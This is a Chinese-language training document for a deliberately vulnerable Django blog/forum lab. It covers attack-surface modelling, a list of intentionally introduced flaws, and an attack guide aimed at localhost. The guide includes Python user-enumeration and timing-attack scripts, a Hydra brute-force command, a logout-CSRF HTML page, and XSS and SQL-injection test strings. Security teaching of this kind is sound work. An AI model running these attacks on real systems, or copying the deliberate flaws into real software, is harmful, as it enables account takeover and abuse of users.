# Phase 1：功能設計與攻擊面建模

> 目標：在寫程式碼之前，識別所有潛在攻擊面

## 應用程式類型

**部落格/論壇系統**

---

## 📊 實作進度總覽

| 模組                | 完成度 | 已實作功能                 | 已引入漏洞數 | 狀態      |
| ------------------- | ------ | -------------------------- | ------------ | --------- |
| 1. 使用者認證與授權 | 50%    | 註冊、登入、登出、個人資料 | 10 個        | ✅ 進行中 |
| 2. 文章管理         | 0%     | -                          | -            | ⏳ 待開始 |
| 3. 留言/評論        | 0%     | -                          | -            | ⏳ 待開始 |
| 4. 使用者個人資料   | 20%    | 查看個人資料               | 1 個 (XSS)   | ⏳ 待開始 |
| 5. 搜尋             | 0%     | -                          | -            | ⏳ 待開始 |
| 6. Admin 後台       | 10%    | Django 內建 Admin          | -            | ⏳ 待開始 |

**整體進度**：**15%**（1.5 / 6 模組）

**已引入漏洞總數**：**11 個**

---

## 功能模組清單

### 1. 使用者認證與授權模組 ✅ 50% 完成

**實作狀態**：

- ✅ 使用者註冊 - `/accounts/register/` (已實作，含刻意漏洞)
- ✅ 登入 - `/accounts/login/` (已實作，含刻意漏洞)
- ✅ 登出 - `/accounts/logout/` (已實作，含刻意漏洞)
- ✅ 個人資料查看 - `/accounts/profile/` (已實作，含 XSS 漏洞)
- ❌ 密碼重設 - 未實作
- ❌ 記住我功能 - 未實作

**已實作的輸入點（User Input）**：

- [x] **註冊表單**：username, email, password, password_confirm
  - 檔案：`accounts/forms.py:RegisterForm`
  - 視圖：`accounts/views.py:register()`
  - 模板：`accounts/templates/accounts/register.html`

- [x] **登入表單**：username, password
  - 檔案：`accounts/forms.py:LoginForm`
  - 視圖：`accounts/views.py:login_view()`
  - 模板：`accounts/templates/accounts/login.html`

- [ ] **密碼重設**：email, new_password, reset_token - 未實作
- [ ] **記住我 checkbox** - 未實作

**身份/權限邊界**：

- [x] **匿名使用者 → 已登入使用者**
  - 使用 Django 內建的 `User` model
  - Session-based 認證機制
  - `@login_required` decorator 保護需要登入的頁面

- [x] **Session 管理**
  - Django 預設 session 機制（Database-backed）
  - Session 在登入時建立
  - Session 在登出時清除
  - ⚠️ 未設置 session timeout

- [ ] **"記住我" token** - 未實作

**與外部系統的互動**：

- [ ] **Email 發送服務** - 未實作（密碼重設需要）
- [x] **Session store** - Database（Django 預設）

**已刻意引入的攻擊面**：

- [x] ✅ **弱密碼**（`accounts/forms.py:86-88`）
  - 沒有檢查密碼複雜度
  - 允許 `123456`, `password`, `admin` 等弱密碼
  - 可以使用長度為 1 的密碼

- [x] ✅ **使用者名稱列舉**（`accounts/forms.py:59-62`）
  - 註冊時明確顯示「此使用者名稱已被使用」
  - 攻擊者可以列舉系統中存在的帳號

- [x] ✅ **Email 列舉**（`accounts/forms.py:72-75`）
  - 註冊時明確顯示「此 Email 已被使用」
  - 攻擊者可以列舉系統中存在的 Email

- [x] ⚠️ **Session Fixation**
  - Django 預設在登入時會重新產生 session ID
  - 因此這個漏洞被 Django 自動防禦了
  - 標記為「已防禦」而非「已引入」

- [x] ✅ **CSRF on logout**（`accounts/views.py:94-109`）
  - 登出使用 GET 方法而非 POST
  - 沒有檢查 CSRF token
  - 任何網站都可以透過 `<img src="/accounts/logout/">` 登出使用者

- [x] ✅ **Timing attack**（`accounts/forms.py:44-68`）
  - 帳號存在時會 `sleep(0.1)` 再驗證密碼
  - 帳號不存在時立即返回錯誤
  - 攻擊者可透過測量回應時間判斷帳號是否存在

- [x] ✅ **暴力破解（無 rate limiting）**（`accounts/views.py`）
  - 可以無限次嘗試註冊
  - 可以無限次嘗試登入
  - 沒有任何限制或 CAPTCHA

- [x] ✅ **資訊洩漏**（`accounts/forms.py:56, 67`）
  - 登入時明確區分「使用者不存在」或「密碼錯誤」
  - 幫助攻擊者確認帳號是否存在

- [x] ✅ **XSS (Stored)**（`accounts/templates/accounts/profile.html`）
  - 個人資料頁面使用 `{{ user.username|safe }}`
  - 如果使用者名稱包含 `<script>` 標籤會被執行

- [x] ✅ **Open Redirect**（`accounts/views.py:80-81`）
  - 登入的 `next` 參數未驗證
  - 可能被用於釣魚攻擊

- [ ] ❌ **Password reset token 可預測** - 未實作（功能未開發）
- [ ] ❌ **Remember me token 未加密** - 未實作（功能未開發）

**測試腳本**：

- ✅ `scripts/user_enumeration.py` - 自動化使用者列舉攻擊

**相關文件**：

- `docs/phase2-attack-testing.md` - 詳細的攻擊測試記錄

---

### 2. 文章管理模組

**功能描述**：

- 建立文章（標題、內容、分類、標籤）
- 編輯文章
- 刪除文章
- 文章列表（公開、個人草稿）
- 文章詳細頁

**輸入點（User Input）**：

- [ ] 文章表單：title, content (rich text), category, tags, status (draft/published)
- [ ] URL parameters：article_id, page, sort_by, filter_by_category

**身份/權限邊界**：

- [ ] 只有作者可以編輯/刪除自己的文章
- [ ] 草稿只有作者可見
- [ ] 已發布文章所有人可見
- [ ] （未來可能有）管理員可以刪除任何文章

**與外部系統的互動**：

- [ ] 圖片上傳服務（文章內嵌圖片）
- [ ] 可能的 CDN（靜態資源）

**潛在攻擊面**：

- [ ] **IDOR**：透過修改 article_id 存取他人草稿
- [ ] **XSS**：文章內容未正確 escape（stored XSS）
- [ ] **HTML Injection**：rich text editor 允許危險標籤
- [ ] **SQLi**：搜尋、排序、篩選參數未正確處理
- [ ] **Mass Assignment**：透過 POST 參數修改 author_id 或 view_count
- [ ] **Business Logic**：刪除文章後仍可透過直接 URL 存取
- [ ] **File Upload**：上傳惡意圖片（webshell、XSS）

---

### 3. 留言/評論模組

**功能描述**：

- 對文章發表評論
- 編輯/刪除自己的評論
- 巢狀回覆（評論的評論）
- 按讚/取消讚

**輸入點（User Input）**：

- [ ] 評論表單：content, parent_comment_id (如果是回覆)
- [ ] URL parameters：comment_id, article_id

**身份/權限邊界**：

- [ ] 需登入才能評論
- [ ] 只能編輯/刪除自己的評論
- [ ] 文章作者可以刪除該文章下的任何評論

**與外部系統的互動**：

- [ ] Email 通知（有人回覆你的評論）

**潛在攻擊面**：

- [ ] **XSS**：評論內容未 escape（stored XSS）
- [ ] **CSRF**：刪除評論、按讚
- [ ] **IDOR**：刪除他人評論
- [ ] **Race Condition**：重複按讚導致計數錯誤
- [ ] **Spam**：無限制發表評論（無 rate limiting）
- [ ] **Logic Bypass**：刪除文章後評論仍可見

---

### 4. 使用者個人資料模組

**功能描述**：

- 查看個人資料頁（公開）
- 編輯個人資料（bio, avatar, social links）
- 查看自己的文章列表
- 查看自己的評論歷史

**輸入點（User Input）**：

- [ ] 個人資料表單：bio, avatar (file upload), website_url, twitter_handle
- [ ] URL parameters：user_id, username

**身份/權限邊界**：

- [ ] 任何人可查看公開資料
- [ ] 只有本人可以編輯自己的資料

**與外部系統的互動**：

- [ ] 圖片儲存服務（頭像上傳）

**潛在攻擊面**：

- [ ] **IDOR**：透過修改 user_id 存取/修改他人資料
- [ ] **File Upload**：頭像上傳惡意檔案
- [ ] **XSS**：bio 或 social links 未正確處理
- [ ] **SSRF**：website_url 欄位可能觸發伺服器端請求
- [ ] **Open Redirect**：website_url 可能被用於釣魚

---

### 5. 搜尋模組

**功能描述**：

- 搜尋文章（標題、內容）
- 搜尋使用者
- 按標籤篩選
- 按分類篩選

**輸入點（User Input）**：

- [ ] 搜尋表單：query, search_type (article/user), category, tag
- [ ] URL parameters：q, type, sort

**身份/權限邊界**：

- [ ] 匿名使用者可以搜尋
- [ ] 只能搜尋到公開內容（不能搜到他人草稿）

**與外部系統的互動**：

- [ ] 可能使用搜尋引擎（ElasticSearch，但暫時用 DB）

**潛在攻擊面**：

- [ ] **SQLi**：搜尋字串未正確 escape
- [ ] **NoSQL Injection**（如果未來改用 MongoDB）
- [ ] **Information Disclosure**：錯誤訊息洩漏資料庫結構
- [ ] **Regex DoS**：複雜正則表達式導致 CPU 消耗

---

### 6. Admin 後台模組（內部 endpoint）

**功能描述**：

- 查看所有使用者
- 查看所有文章（包含草稿）
- 刪除違規內容
- 查看系統統計資料

**輸入點（User Input）**：

- [ ] Admin dashboard URL：/admin/
- [ ] 各種管理操作的參數

**身份/權限邊界**：

- [ ] 只有 is_staff=True 的使用者可存取
- [ ] 需要額外的權限檢查

**與外部系統的互動**：

- [ ] 無

**潛在攻擊面**：

- [ ] **Missing Authorization**：忘記檢查 is_staff
- [ ] **IDOR**：管理員刪除內容時未驗證權限
- [ ] **CSRF**：管理操作缺少 CSRF token
- [ ] **Information Disclosure**：統計資料洩漏敏感資訊
- [ ] **Session Hijacking**：Admin session 未設置更嚴格的 timeout

---

## 不應該信任使用者的地方（Trust Boundaries）

### 絕對不可信任

1. **所有 URL 參數**（id, page, sort, filter 等）
2. **所有 POST 資料**（表單輸入、JSON payload）
3. **所有檔案上傳**（檔案類型、大小、內容）
4. **HTTP Headers**（User-Agent, Referer, X-Forwarded-For）
5. **Cookie 內容**（除了 signed session cookie）

### 需要二次驗證

1. **Session data**（使用者可能 session fixation）
2. **Email 內容**（可能被用於 header injection）
3. **Redirect URLs**（可能被用於 open redirect）

### 內部系統也需要驗證

1. **Admin endpoints**（即使是內部使用者也要驗證權限）
2. **API endpoints**（即使前端做了驗證，後端仍需再驗證）

---

## Attack Surface 總結（5 分鐘版）

### 輸入點統計

- **表單輸入**：7 個表單（註冊、登入、重設密碼、文章、評論、個人資料、搜尋）
- **URL 參數**：article_id, comment_id, user_id, page, sort, filter, query
- **檔案上傳**：2 處（文章圖片、使用者頭像）
- **Admin endpoints**：1 個完整的後台系統

### 高風險區域（優先關注）

1. **Rich Text Editor**（文章、評論）→ XSS, HTML Injection
2. **檔案上傳**（頭像、文章圖片）→ Webshell, XSS
3. **ID-based 權限控制**（文章、評論、個人資料）→ IDOR
4. **搜尋功能**→ SQLi
5. **Admin 後台**→ Missing Authorization

### 權限邊界

- **3 種角色**：匿名、已登入、管理員
- **2 種資料狀態**：草稿（私有）、已發布（公開）
- **所有權**：使用者只能操作自己的資料

### 外部互動

- **Email 發送**（密碼重設、通知）
- **檔案儲存**（本地或 S3）
- **Session store**（Database 或 Redis）

---

## Phase 2：實戰攻擊指南

### 🎯 本階段學習重點

**理解「攻擊者思維」**：

1. **輸入驗證繞過** - 如何繞過前端和後端的驗證
2. **資訊收集** - 如何透過錯誤訊息、回應時間收集情報
3. **權限邊界測試** - 如何測試是否能存取不屬於自己的資料
4. **自動化攻擊** - 如何使用工具進行大量測試

**防禦者視角**：

1. 理解每個漏洞的**根本原因**
2. 知道**如何檢測**這些攻擊
3. 學習**修復方法**和**最佳實踐**

---

### 📋 目前已實作的功能與漏洞

| 功能       | URL                   | 已引入的漏洞                              | 嚴重程度 |
| ---------- | --------------------- | ----------------------------------------- | -------- |
| 使用者註冊 | `/accounts/register/` | 使用者列舉、弱密碼、無 Rate Limiting      | 中       |
| 使用者登入 | `/accounts/login/`    | Timing Attack、資訊洩漏、無 Rate Limiting | 高       |
| 使用者登出 | `/accounts/logout/`   | CSRF on Logout                            | 中       |

---

### 🧪 測試操作指引

#### 1. 正常功能測試（白箱）

**目的**：了解系統預期行為

```bash
# 1. 註冊一個新帳號
瀏覽器訪問: http://localhost:8000/accounts/register/
- 使用者名稱: testuser
- Email: test@example.com
- 密碼: 123456 (刻意使用弱密碼)
✅ 應該註冊成功

# 2. 登入
瀏覽器訪問: http://localhost:8000/accounts/login/
- 使用者名稱: testuser
- 密碼: 123456
✅ 應該登入成功

# 3. 登出
點擊導航列的「登出」按鈕
✅ 應該登出成功
```

#### 2. 邊界測試（灰箱）

**目的**：測試系統在異常輸入下的行為

```bash
# 測試 1：超長使用者名稱
使用者名稱: aaaaaaaaaaaaaaaaaaaaaaaa...(超過 150 字元)
❓ 系統會拒絕還是截斷？

# 測試 2：特殊字元
使用者名稱: admin<script>alert(1)</script>
❓ 系統會過濾嗎？

# 測試 3：SQL 注入字元
使用者名稱: admin' OR '1'='1
❓ 會觸發錯誤嗎？

# 測試 4：空密碼
密碼: (留空)
❓ 前端會阻止還是後端會檢查？
```

---

### 🔴 攻擊實戰演練

#### 攻擊 1：使用者名稱列舉（User Enumeration）

**漏洞位置**：`/accounts/register/`

**攻擊目的**：收集系統中存在的使用者名稱

**攻擊步驟**：

```bash
# 方法 1：手動測試
1. 訪問註冊頁面
2. 嘗試註冊 "admin"
   ✅ 如果顯示「此使用者名稱已被使用」→ admin 帳號存在
   ❌ 如果顯示其他錯誤 → admin 帳號不存在

# 方法 2：使用 Burp Suite Intruder
1. 攔截註冊請求
2. 將 username 欄位標記為 payload 位置
3. 載入常見使用者名稱字典（admin, root, user, test...）
4. 啟動攻擊
5. 分析回應：
   - 狀態碼 200 + "此使用者名稱已被使用" → 存在
   - 狀態碼 200 + 其他訊息 → 不存在

# 方法 3：使用 Python 腳本自動化
```

**Python 攻擊腳本範例**：

```python
import requests

target = "http://localhost:8000/accounts/register/"
usernames = ["admin", "root", "user", "test", "administrator"]

# 先取得 CSRF token
session = requests.Session()
response = session.get(target)
csrf_token = session.cookies.get('csrftoken')

for username in usernames:
    data = {
        'username': username,
        'email': 'test@test.com',
        'password': 'password123',
        'password_confirm': 'password123',
        'csrfmiddlewaretoken': csrf_token
    }

    response = session.post(target, data=data)

    if "此使用者名稱已被使用" in response.text:
        print(f"[+] 找到使用者: {username}")
    else:
        print(f"[-] 使用者不存在: {username}")
```

**防禦者應該看到什麼**：

- 大量來自同一 IP 的註冊請求
- 相同的 email 但不同的 username

---

#### 攻擊 2：Timing Attack（時間側信道攻擊）

**漏洞位置**：`/accounts/login/`

**攻擊目的**：透過回應時間判斷帳號是否存在

**攻擊原理**：

- 帳號存在 → 驗證密碼（有 sleep(0.1)）→ 回應較慢
- 帳號不存在 → 立即返回錯誤 → 回應較快

**攻擊步驟**：

```bash
# 方法 1：手動測試（使用瀏覽器開發者工具）
1. 打開開發者工具 → Network
2. 測試存在的帳號：
   - 使用者名稱: testuser (已註冊)
   - 密碼: wrongpassword
   - 觀察 Network 的 Time 欄位 (應該 > 100ms)

3. 測試不存在的帳號：
   - 使用者名稱: nonexistuser
   - 密碼: anything
   - 觀察 Network 的 Time 欄位 (應該 < 50ms)

# 方法 2：使用 cURL 測試
time curl -X POST http://localhost:8000/accounts/login/ \
  -d "username=testuser&password=wrong" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Python 攻擊腳本**：

```python
import requests
import time

target = "http://localhost:8000/accounts/login/"
usernames = ["admin", "test", "user", "nonexist"]

session = requests.Session()
response = session.get(target)
csrf_token = session.cookies.get('csrftoken')

for username in usernames:
    data = {
        'username': username,
        'password': 'wrongpassword',
        'csrfmiddlewaretoken': csrf_token
    }

    start_time = time.time()
    response = session.post(target, data=data)
    elapsed_time = time.time() - start_time

    print(f"{username}: {elapsed_time:.3f}秒")

    # 如果回應時間 > 0.1 秒，可能帳號存在
    if elapsed_time > 0.1:
        print(f"  [!] 可能存在的帳號: {username}")
```

---

#### 攻擊 3：暴力破解（Brute Force）

**漏洞位置**：`/accounts/login/`

**攻擊目的**：嘗試所有可能的密碼組合

**攻擊步驟**：

```bash
# 使用 Hydra 進行暴力破解
hydra -l testuser -P /usr/share/wordlists/rockyou.txt \
  localhost -s 8000 http-post-form \
  "/accounts/login/:username=^USER^&password=^PASS^:密碼錯誤"

# 使用 Burp Suite Intruder
1. 攔截登入請求
2. 將 password 欄位標記為 payload
3. 載入密碼字典
4. 啟動攻擊
5. 尋找狀態碼或回應內容不同的請求
```

**防禦者應該看到什麼**：

- 短時間內大量失敗的登入嘗試
- 來自同一 IP 或 session

---

#### 攻擊 4：CSRF on Logout（跨站請求偽造）

**漏洞位置**：`/accounts/logout/`

**攻擊目的**：在受害者不知情的情況下登出其帳號

**攻擊原理**：

- 登出使用 GET 方法
- 沒有 CSRF token 驗證
- 任何網站都可以觸發登出請求

**攻擊步驟**：

```html
<!-- 攻擊者建立一個惡意網頁 evil.html -->
<!DOCTYPE html>
<html>
  <head>
    <title>免費贈品！</title>
  </head>
  <body>
    <h1>恭喜！你獲得了免費贈品！</h1>
    <p>請等待...</p>

    <!-- 🔴 自動登出受害者 -->
    <img src="http://localhost:8000/accounts/logout/" style="display:none;" />

    <!-- 或使用 JavaScript -->
    <script>
      fetch("http://localhost:8000/accounts/logout/", {
        credentials: "include", // 包含受害者的 cookie
      });
    </script>
  </body>
</html>
```

**測試步驟**：

1. 在 `http://localhost:8000` 登入
2. 開啟上述 `evil.html`
3. 回到 `http://localhost:8000`
4. ✅ 你已被登出

---

#### 攻擊 5：弱密碼攻擊

**漏洞位置**：`/accounts/register/`

**攻擊目的**：建立弱密碼帳號，方便後續攻擊

**攻擊步驟**：

```bash
# 測試各種弱密碼
密碼: 123456     ✅ 應該成功
密碼: password   ✅ 應該成功
密碼: admin      ✅ 應該成功
密碼: 111111     ✅ 應該成功
密碼: a          ✅ 應該成功（長度為 1）
```

---

### 🛠️ 推薦攻擊工具

| 工具                 | 用途                 | 使用場景                       |
| -------------------- | -------------------- | ------------------------------ |
| **Burp Suite**       | Web 應用程式安全測試 | 攔截請求、自動化攻擊、漏洞掃描 |
| **OWASP ZAP**        | 開源 Web 安全掃描器  | 自動化漏洞掃描                 |
| **Hydra**            | 暴力破解工具         | 測試登入的強度                 |
| **Python Requests**  | HTTP 請求庫          | 撰寫自訂攻擊腳本               |
| **cURL**             | 命令列 HTTP 工具     | 快速測試 API endpoint          |
| **Browser DevTools** | 瀏覽器開發者工具     | 檢查 Network、修改請求         |

---

### ✅ 檢查清單

完成以下測試後，你就完全理解了這些漏洞：

- [ ] 成功列舉出至少 3 個存在的使用者名稱
- [ ] 透過 Timing Attack 區分帳號存在/不存在
- [ ] 撰寫 Python 腳本自動化使用者列舉
- [ ] 使用 Burp Suite 進行暴力破解測試
- [ ] 建立 CSRF 攻擊頁面成功登出受害者
- [ ] 註冊至少 5 種不同的弱密碼帳號
- [ ] 理解每個漏洞的**根本原因**
- [ ] 提出每個漏洞的**修復方案**

---

### 📚 延伸學習

**下一步**：

1. 記錄每個成功的攻擊方法
2. 思考：「如果我是開發者，如何防禦這些攻擊？」
3. 閱讀 OWASP Top 10 中的相關章節
4. 準備進入 Phase 3：威脅建模與修復
